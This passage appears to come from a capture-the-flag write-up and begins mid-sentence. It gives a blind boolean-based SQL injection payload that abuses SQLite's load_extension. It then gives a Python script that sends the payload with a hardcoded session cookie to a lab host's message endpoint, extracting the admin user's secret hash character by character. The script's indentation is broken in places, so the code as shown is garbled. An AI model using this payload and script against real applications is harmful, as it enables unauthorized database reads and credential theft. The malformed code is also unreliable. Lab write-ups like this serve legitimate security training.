
boolean-based exploitation, which we can build upon.
' and case when (select 1 from users where username='admin') then 1 else
load_extension(1) end)-- -
from requests import post
sql = "' and case when (select substr((select secret from users where
username='admin'),{},1)='{}') then 1 else load_extension(1) end)-- -"
url = "http://10.10.10.195/submitmessage"
cookies = { "auth" :
"dXNlcm5hbWU9Z3Vlc3Q7c2VjcmV0PTg0OTgzYzYwZjdkYWFkYzFjYjg2OTg2MjFmODAyYzBkOWY5YTNjM2MyOTVjODEwNzQ4ZmIwNDgxMTVjMTg2ZWM7.v2XAccd+Z4N1hjqDQmFypJr+MwRrUKQ8RX7VZf/8rcI=" }
chars = "0123456789abcdef"
def testChar(query):
    payload = { "message" : query }
    resp = post(url, data = payload, cookies = cookies)
    if 'OK' in resp.text:
    return True
    return False
def getCharAtPos(pos):
    for char in chars:
    query = sql.format(pos, char)
        if testChar(query):
            return char
def getHash():
    hash = ''
    for i in range(1, 65):
        hash += getCharAtPos(i)
        print(hash)
if __name__ == '__main__':
    getHash()
